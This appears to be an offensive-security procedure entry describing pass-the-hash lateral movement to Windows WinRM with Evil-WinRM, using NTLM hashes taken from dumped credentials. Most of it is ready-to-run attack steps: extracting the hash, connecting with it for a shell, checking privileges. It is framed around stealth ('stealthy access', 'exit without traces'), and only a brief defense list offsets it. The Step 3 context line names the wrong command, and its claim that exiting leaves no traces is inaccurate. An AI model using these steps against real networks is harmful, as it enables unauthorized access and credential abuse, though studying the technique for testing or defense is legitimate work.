---
type: procedure
description: >-
  Authenticate to WinRM using NTLM hashes via pass-the-hash, bypassing password
  cracking for rapid lateral movement.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Domain Accounts]]'
  - '[[Pass the Hash]]'
sub_techniques: []
tags:
  - network
  - pass-the-hash
  - winrm
  - shell
platforms:
  - Linux
  - Windows
commands:
  - '[[commands/Evil-WinRM-Connect-with-NTLM-Hash]]'
tools:
  - '[[tools/Evil-WinRM]]'
validated: true
---

# Connect-to-WinRM-from-Linux-with-Pass-the-Hash

## Summary

This procedure connects to WinRM using an NTLM hash instead of plaintext password, leveraging PTH for stealthy access with dumped creds.

## Description

PTH exploits NTLM auth in WinRM, allowing hash reuse without cracking. Ideal for pivoting post-secretsdump, maintaining opsec by avoiding password logs.

## Requirements

1. NTLM hash from dump (32 hex chars)
2. Username and target IP
3. Evil-WinRM supporting -H flag
4. WinRM port 5985 open

## Defense

- Disable NTLM; enforce Kerberos only
- Use NTLM auditing (Event ID 4624 type 3)
- Restrict WinRM to Kerberos auth
- Block PTH with LAPS and credential guard

## Objectives

1. Gain shell with hash only
2. Pivot without cracking
3. Maintain access chain

## Instructions

### Step 1: Prepare Hash

**Context**: Extract clean NTLM hash.

**Command**:
```bash
cut -d: -f4 hashes.txt | head -1
```

> Gets nthash.

### Step 2: Connect via PTH

**Context**: Use -H for hash.

**Command** ([[commands/Evil-WinRM-Connect-with-NTLM-Hash]]):
```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
```

> Authenticates. Expected: Shell prompt.

### Step 3: Verify Access

**Context**: Run id command.

**Command** (in shell):
```powershell
whoami /all
```

> Confirms privileges.

### Step 4: Disconnect Securely

**Context**: Exit without traces.

**Command**:
```bash
exit
```

> Success: PTH connection established.
